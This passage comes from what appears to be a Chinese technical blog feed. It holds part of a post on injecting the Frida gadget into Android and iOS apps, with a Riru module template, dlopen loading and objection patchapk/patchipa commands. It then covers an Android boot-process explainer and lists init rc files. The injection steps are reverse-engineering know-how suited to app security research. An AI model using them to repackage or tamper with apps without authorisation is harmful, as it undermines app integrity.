https://github.com/RikkaApps/Riru/blob/77adfd6a4a6a81bfd20569c910bc4854f2f84f5e/riru-core/jni/main/jni_native_method.cpp#L55-L66</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>EXPORT __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;default&quot;</span>))) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">specializeAppProcessPre</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv *env, jclass clazz, jint *_uid, jint *gid, jintArray *gids, jint *runtimeFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobjectArray *rlimits, jint *mountExternal, jstring *seInfo, jstring *niceName,</span></span><br><span class="hljs-params"><span class="hljs-function">        jboolean *startChildZygote, jstring *instructionSet, jstring *appDataDir,</span></span><br><span class="hljs-params"><span class="hljs-function">        jboolean *isTopApp, jobjectArray *pkgDataInfoList, jobjectArray *whitelistedDataInfoList,</span></span><br><span class="hljs-params"><span class="hljs-function">        jboolean *bindMountAppDataDirs, jboolean *bindMountAppStorageDirs)</span> </span>&#123;<br>    <span class="hljs-comment">// added from Android 10, but disabled at least in Google Pixel devices</span><br>&#125;<br><br>EXPORT __attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;default&quot;</span>))) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">specializeAppProcessPost</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv *env, jclass clazz)</span> </span>&#123;<br>    <span class="hljs-comment">// added from Android 10, but disabled at least in Google Pixel devices</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">void</span> <span class="hljs-title">nativeForkSystemServerPre</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv *env, jclass clazz, <span class="hljs-keyword">uid_t</span> *uid, <span class="hljs-keyword">gid_t</span> *gid, jintArray *gids, jint *runtimeFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobjectArray *rlimits, jlong *permittedCapabilities, jlong *effectiveCapabilities)</span> </span>&#123;<br><br>&#125;<br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">int</span> <span class="hljs-title">nativeForkSystemServerPost</span><span class="hljs-params">(JNIEnv *env, jclass clazz, jint res)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// in system server process</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// in zygote process, res is child pid</span><br>        <span class="hljs-comment">// don&#x27;t print log here, see https://github.com/RikkaApps/Riru/blob/77adfd6a4a6a81bfd20569c910bc4854f2f84f5e/riru-core/jni/main/jni_native_method.cpp#L55-L66</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">int</span> <span class="hljs-title">shouldSkipUid</span><span class="hljs-params">(<span class="hljs-keyword">int</span> uid)</span> </span>&#123;<br>    <span class="hljs-comment">// by default, Riru only call module functions in &quot;normal app processes&quot; (10000 &lt;= uid % 100000 &lt;= 19999)</span><br>    <span class="hljs-comment">// false = don&#x27;t skip</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function">EXPORT <span class="hljs-keyword">void</span> <span class="hljs-title">onModuleLoaded</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// called when the shared library of Riru core is loaded</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ROM定制加载gadget"><a href="#ROM定制加载gadget" class="headerlink" title="ROM定制加载gadget"></a>ROM定制加载gadget</h3><p>APP启动流程的任意一点，都可以加载gadget.so</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">dlopen<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>load<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>loadLibrary<br></code></pre></td></tr></table></figure><h3 id="objection自动添加gadget"><a href="#objection自动添加gadget" class="headerlink" title="objection自动添加gadget"></a>objection自动添加gadget</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">objection</span> patchapk -s  xxxxx.apk <br>objection patchipa -s  xxxxx.ipa<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>frida</tag>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>android开机后都发生了什么?</title>
    <link href="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <url>/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<h2 id="1-启动流程"><a href="#1-启动流程" class="headerlink" title="1. 启动流程"></a>1. 启动流程</h2><p>Android系统启动过程往细了说可以分为5步：</p><p>Loader –&gt; Kernel –&gt; Native –&gt; Framework –&gt; Application</p> <img src="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/images/android%E6%9E%B6%E6%9E%84.png" class=""><h3 id="1-1-Loader"><a href="#1-1-Loader" class="headerlink" title="1.1 Loader"></a>1.1 Loader</h3><ul><li><p>Boot ROM: 当手机处于关机状态时，长按Power键开机，引导芯片开始从固化在ROM里的预设出代码开始执行，然后加载引导程序到RAM</p></li><li><p>Boot Loader: 这是启动Android系统之前的引导程序，主要是检查RAM，初始化硬件参数等功能</p></li></ul><h3 id="1-2-Kernel"><a href="#1-2-Kernel" class="headerlink" title="1.2 Kernel"></a>1.2 Kernel</h3><p>Kernel层是指Android内核层，到这里才刚刚开始进入Android系统</p><ul><li><p>启动Kernel的swapper进程(pid=0)：该进程又称为idle进程, 系统初始化过程Kernel由无到有开创的第一个进程, 用于初始化进程管理、内存管理，加载Display,Camera Driver，Binder Driver等相关工作</p></li><li><p>启动kthreadd进程（pid=2）：是Linux系统的内核进程，会创建内核工作线程kworkder，软中断线程ksoftirqd，thermal等内核守护进程。kthreadd进程是所有内核进程的鼻祖</p></li></ul><h3 id="1-3-Native"><a href="#1-3-Native" class="headerlink" title="1.3 Native"></a>1.3 Native</h3><p>这里的Native层主要包括init孵化来的用户空间的守护进程、HAL层以及开机动画等。启动init进程(pid=1),是Linux系统的用户进程，init进程是所有用户进程的鼻祖</p><ul><li>init进程会孵化出ueventd、logd、healthd、installd、adbd、lmkd等用户守护进程</li><li>init进程还启动servicemanager(binder服务管家)、bootanim(开机动画)等重要服务</li><li>init进程孵化出Zygote进程，Zygote进程是Android系统的第一个Java进程(即虚拟机进程)，Zygote是所有Java进程的父进程</li></ul><h3 id="1-4-Framework"><a href="#1-4-Framework" class="headerlink" title="1.4 Framework"></a>1.4 Framework</h3><ul><li>Zygote进程启动后，加载ZygoteInit类，注册Zygote Socket服务端套接字；加载虚拟机；加载类，加载系统资源</li><li>System Server进程，是由Zygote进程fork而来，System Server是Zygote孵化的第一个进程，System Server负责启动和管理整个Java framework，包含ActivityManager，PowerManager等服务</li><li>Media Server进程，是由init进程fork而来，负责启动和管理整个C++ framework，包含AudioFlinger，Camera Service等服务</li></ul><h3 id="1-5-Application"><a href="#1-5-Application" class="headerlink" title="1.5 Application"></a>1.5 Application</h3><ul><li>Zygote进程孵化出的第一个App进程是Launcher，即手机桌面APP，没错，手机桌面就是跟我们平时使用的APP一样，它也是一个应用</li><li>所有APP进程都是由zygote进程fork出来的</li></ul><p>这些层之间，有的并不能直接交流，比如Native与Kernel之间要经过系统调用才能访问，Java层和Native层需要通过JNI进行调用</p><p>严格来说，Android系统实际上是运行于Linux内核上的一系列服务进程，这些进程是维持设备正常运行的关键，而这些进程的老祖宗就是init进程</p><h2 id="2-启动流程-以Zygote启动流程为例"><a href="#2-启动流程-以Zygote启动流程为例" class="headerlink" title="2. 启动流程(以Zygote启动流程为例)"></a>2. 启动流程(以Zygote启动流程为例)</h2><p>当内核启动完成后，就会创建用户空间的第一个进程，即init进程；后面所有的进程，比如Binder机制中的ServiceManager，Zygote都是由init进程孵化出来的</p><h3 id="对比老版本差异"><a href="#对比老版本差异" class="headerlink" title="对比老版本差异"></a>对比老版本差异</h3><p>在Android Q中，对该机制做了一些改变 </p><p>单一的init.rc，被拆分，服务根据其二进制文件的位置（/system，/vendor，/odm）定义到对应分区的etc/init目录中，每个服务一个rc文件。与该服务相关的触发器、操作等也定义在同一rc文件中。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/system/</span>etc/init，包含系统核心服务的定义，如SurfaceFlinger、MediaServer、Logcatd等。<br><span class="hljs-regexp">/vendor/</span>etc/init， SOC厂商针对SOC核心功能定义的一些服务。比如高通、MTK某一款SOC的相关的服务。<br><span class="hljs-regexp">/odm/</span>etc<span class="hljs-regexp">/init，OEM/</span>ODM厂商如小米、华为、OPP其产品所使用的外设以及差异化功能相关的服务。<br></code></pre></td></tr></table></figure><p>下图为Android Q 中定义的所有服务</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs gradle">.<span class="hljs-regexp">/recovery/</span>root/init.rc<br>.<span class="hljs-regexp">/recovery/</span>root/ueventd.rc<br>.<span class="hljs-regexp">/recovery/</span>root/init.recovery.mt6762.rc<br>.<span class="hljs-regexp">/recovery/</span>root/init.recovery.mt6765.rc<br>.<span class="hljs-regexp">/vendor/u</span>eventd.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.wmt_drv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.volte_imsm_93.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/m</span>tk_agpsd_p.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>bootperf.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>audiocmdservice_atci.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.graphics.composer@<span class="hljs-number">2.1</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.gpu@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.volte_stack.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit_connectivity.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.fmradio_drv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>netdagent.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>atcid_eng.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.vtservice_hidl.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/m</span>tkrild.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.health@<span class="hljs-number">2.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.wfca.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/m</span>odemdbfilter_service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.bt_drv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.gps_drv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>aee_aedv64.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.secure_element@<span class="hljs-number">1.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.drm@<span class="hljs-number">1.2</span>-service.clearkey.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.log@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.thermal_manager.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.bip.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.cccimdinit.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/m</span>d_monitor.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/mu</span>xreport.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.drm@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.wlan_drv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.drm@<span class="hljs-number">1.2</span>-service.widevine.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>wlan_assistant.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>camerahalserver.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>atci_service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.cas@<span class="hljs-number">1.1</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>psec_mon.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.thermal@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.gatekeeper@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.keymaster@<span class="hljs-number">4.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.thermalloadalgod.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.graphics.allocator@<span class="hljs-number">2.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.mtkpower@<span class="hljs-number">1.0</span>-init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>lbs_hidl_service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.sensors@<span class="hljs-number">2.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hostapd.android.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.thermal.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>fuelgauged_nvram_init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>em_hidl_eng.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.mtkpower@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.cccirpcd.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.volte_md_status.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.light@<span class="hljs-number">2.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>aee_aedv.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.cccifsd.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/g</span>sm0710muxd.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>loghidlvendorservice.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>fuelgauged_init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.wifi@<span class="hljs-number">1.0</span>-service-lazy-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.bluetooth@<span class="hljs-number">1.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>ppl_agent.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.<span class="hljs-keyword">project</span>.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.sensor_1_0.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.mt6765.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/meta_init.connectivity.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/meta_init.<span class="hljs-keyword">project</span>.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/multi_init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/factory_init.<span class="hljs-keyword">project</span>.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/factory_init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.mt6762.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.mt6765.usb.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/factory_init.connectivity.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.connectivity.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.aee.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.modem.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/init.ago.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/meta_init.modem.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>hw/meta_init.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.md_apps.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.media.omx@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.volte_ua.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>nvram_daemon.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.wod.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.nvram@<span class="hljs-number">1.1</span>-sevice.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.memtrack@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.configstore@<span class="hljs-number">1.1</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.usb@<span class="hljs-number">1.1</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.mtkcodecservice@<span class="hljs-number">1.1</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/i</span>nit.volte_imcb.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.audio@<span class="hljs-number">5.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.vibrator@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.mms@<span class="hljs-number">1.3</span>-service.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vndservicemanager.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>android.hardware.gnss@<span class="hljs-number">2.0</span>-service-mediatek.rc<br>.<span class="hljs-regexp">/vendor/</span>etc<span class="hljs-regexp">/init/</span>vendor.mediatek.hardware.pq@<span class="hljs-number">2.2</span>-service.rc<br>.<span class="hljs-regexp">/system/</span>apex<span class="hljs-regexp">/com.android.media.swcodec/</span>etc/init.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>dlogger.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>atrace.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>ediaextractor.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>surfaceflinger.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>ashmemd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>android.system.suspend@<span class="hljs-number">1.0</span>-service.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/u</span>ncrypt.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>camerapostalgo.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>bootlogoupdater.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>art_apex_boot_integrity.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/u</span>sbd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>odemdbfilter_client.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>atci_service_sys.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>drmserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>recovery-persist.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>aee_aed64.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>keystore.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>wait_for_keymaster.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>obile_log_d.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/m</span>ediaserver.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>hwservicemanager.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>nit-debug.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/g</span>puservice.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>logd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>ncidentd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>servicemanager.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>lpdumpd.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/i</span>dmap2d.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>bootstat.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>blank_screen.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>bootstat-debug.rc<br>.<span class="hljs-regexp">/system/</span>etc<span class="hljs-regexp">/init/</span>storaged.rc<br>.<span 